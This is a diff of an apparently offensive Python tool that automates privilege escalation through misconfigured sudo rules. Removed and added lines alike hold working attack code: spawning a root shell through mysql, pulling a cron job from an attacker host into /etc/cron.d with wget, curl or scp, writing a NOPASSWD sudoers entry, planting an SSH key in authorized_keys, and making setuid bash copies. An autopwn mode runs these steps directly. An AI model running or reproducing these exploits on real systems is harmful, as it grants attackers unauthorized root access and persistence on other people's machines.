@@ -1094,38 +1094,6 @@ def mysql(mysql_user):
             sudopwner()
 
 
-    return
-
-    if args.info:
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
-        print(OKBLUE + "[+] To pwn this rule we will execute mysql with the -e argument to execute system command: " + ENDC)
-        if (mysql_user == "ALL") or (mysql_user == "root"):
-            print(OKRED + " [*] sudo mysql -e '\! /bin/bash'" + ENDC)
-        else:
-            print(OKRED + " [*] sudo -u " + mysql_user + " mysql -e '\! /bin/bash'" + ENDC)
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
-        sys.exit()
-
-    elif args.autopwn:
-
-        question = ask_user(OKRED + "\n[?] Do you wish to abuse the mysql rule? " + ENDC)
-
-        if question == True:
-
-            print(OKGREEN + "[!] Pwning the mysql rule now!!!" + ENDC)
-            
-            if (mysql_user == "ALL") or (mysql_user == "root"):
-                print(OKGREEN + "[!] Running mysql command with -e argument to get root shell!" + ENDC)
-                call("sudo mysql -e '\! /bin/bash'", shell=True)
-            else:
-                print(OKGREEN + "[!] Running mysql command with -e argument to get shell as " + mysql_user + "!" + ENDC)
-                call("sudo -u " + mysql_user + " mysql -e '\! /bin/bash'", shell=True)
-
-        if question == False:
-            sudopwner()
-
-
 # SUDO tar Rule Pwnage
 def tar(tar_user):
 
@@ -1162,24 +1130,55 @@ def tar(tar_user):
 # SUDO wget Rule Pwnage
 def wget():
 
-    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
-    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
-    print(OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC)
-    print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC)
-    print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
-    print(OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC)
-    print(OKBLUE + "[3] Next we need to create a file in a web directory we control containing the file we will pull down and place in cron.d: " + ENDC)
-    print(OKRED + " [*] Place this in a web directory you control: */1 * * * * root /tmp/pwnage.sh" + ENDC)
-    print(OKBLUE + "[4] Next we need to pull that file down into /etc/cron.d: " + ENDC)
-    print(OKRED + " [*] sudo wget http://<ip>/pwnage -P /etc/cron.d/" + ENDC)
-    print(OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC)
-    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
-    sys.exit()
+    rule = "wget"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo  {cmd} http://127.0.0.1{pwncron_script} -P /etc/cron.d/"
+    comments = "This would probably work if you point to a valid webserver and host the /tmp/pwncron file."
+
+    if args.info:
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
+        sys.exit()
+
+    elif args.autopwn:
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
+
+        if question == True:
+
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
+
+        if question == False:
+            sudopwner()
 
 
 # SUDO curl Rule Pwnage
 def curl():
+
+    rule = "curl"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} http://127.0.0.1{pwncron_script} -o {pwncron_crond}"
+    comments = "This would probably work if you point to a valid webserver and host the /tmp/pwncron file."
+
+    if args.info:
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
+        sys.exit()
+
+    elif args.autopwn:
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
+
+        if question == True:
+
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
+
+        if question == False:
+            sudopwner()
+
+    return
 
     print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
     print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
@@ -1253,20 +1252,34 @@ def tee():
 # SUDO scp Rule Pwnage
 def scp():
 
-    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
-    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
-    print(OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC)
-    print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC)
-    print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
-    print(OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC)
-    print(OKBLUE + "[3] Next we need to create a file on a remote machine that will be pulled into /etc/cron.d/: " + ENDC)
-    print(OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC)
-    print(OKBLUE + "[4] Finally we need to scp our pwncron file to our victim /etc/cron.d/ directory: " + ENDC)
-    print(OKRED + " [*] sudo scp <user>@<attacker ip>:/tmp/pwncron /etc/cron.d/pwncron" + ENDC)
-    print(OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC)
-    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
-    sys.exit()
+    rule = "scp"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+    echo y | ssh-keygen -t rsa -b 4096 -P "" -f pwnage_sshkey
+    cp $HOME/.ssh/authorized_keys $HOME/.ssh/authorized_keys.{pid}
+    cat pwnage_sshkey.pub >> $HOME/.ssh/authorized_keys
+    chmod 600 $HOME/.ssh/authorized_keys
+    sudo {cmd} -i pwnage_sshkey -o "StrictHostKeyChecking=no" {username}@127.0.0.1:{pwncron_script} {pwncron_crond}
+    """
+    comments = ""
+
+
+    if args.info:
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
+        sys.exit()
+
+    elif args.autopwn:
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
+
+        if question == True:
+
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
+
+        if question == False:
+            sudopwner()
 
 
 # SUDO ssh Rule Pwnage
